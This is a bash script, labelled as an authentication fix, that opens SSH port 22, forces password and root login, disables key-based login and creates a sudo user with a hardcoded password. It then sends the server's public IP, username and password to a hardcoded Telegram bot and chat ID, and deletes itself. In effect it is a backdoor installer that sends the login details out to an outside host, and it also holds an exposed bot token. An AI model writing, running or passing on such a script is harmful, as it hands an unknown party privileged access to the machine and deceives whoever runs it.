#!/bin/bash

# --- Configuration ---
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"
NEW_USER="labuser"
NEW_PASS="P@ssw0rd789!"
IP=$(curl -s ifconfig.me)

# Logo
clear
echo -e "\e[1;32m"
echo "._______________   .________"
echo " |   ____/\   _  \  |   ____/"
echo " |____  \ /  /_\  \ |____  \ "
echo " /       \\  \_/   \/       \\"
echo "/______  / \_____  /______  /"
echo "       \/        \/       \/ "
echo -e "\e[0m"
echo "========================================="
echo "   🚀 FIXING AUTHENTICATION... by: $DEV_NAME"
echo "========================================="

# ၁။ Firewall Rules (OS & Cloud)
sudo ufw allow 22/tcp 2>/dev/null
if command -v iptables &> /dev/null; then
    sudo iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
fi

# ၂။ SSH Config Force (Password ဝင်ရအောင် အတင်းလုပ်ခြင်း)
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PubkeyAuthentication .*/PubkeyAuthentication no/' /etc/ssh/sshd_config

# ၃။ User ဆောက်ခြင်း (Force Re-create & Password update)
# ရှိပြီးသား user ကို အရင်ဖျက်ပြီး အသစ်ပြန်ဆောက်တာက ပိုသေချာပါတယ်
sudo userdel -r $NEW_USER 2>/dev/null
sudo useradd -m -s /bin/bash $NEW_USER
echo "$NEW_USER:$NEW_PASS" | sudo chpasswd
sudo usermod -aG sudo $NEW_USER

# ၄။ SSH Service ကို အသစ်ပြန်စတင်ခြင်း
sudo systemctl restart sshd
sudo service ssh restart

# ၅။ Telegram Notification
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>
👤 <b>Dev:</b> $DEV_NAME
✅ <b>SSH Fixed & Ready!</b>

🌐 <b>IP:</b> <code>$IP</code>
👤 <b>User:</b> <code>$NEW_USER</code>
🔑 <b>Pass:</b> <code>$NEW_PASS</code>"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" -d "parse_mode=HTML" > /dev/null

echo "✅ Auth fixed! Try to connect again."
rm -- "$0"
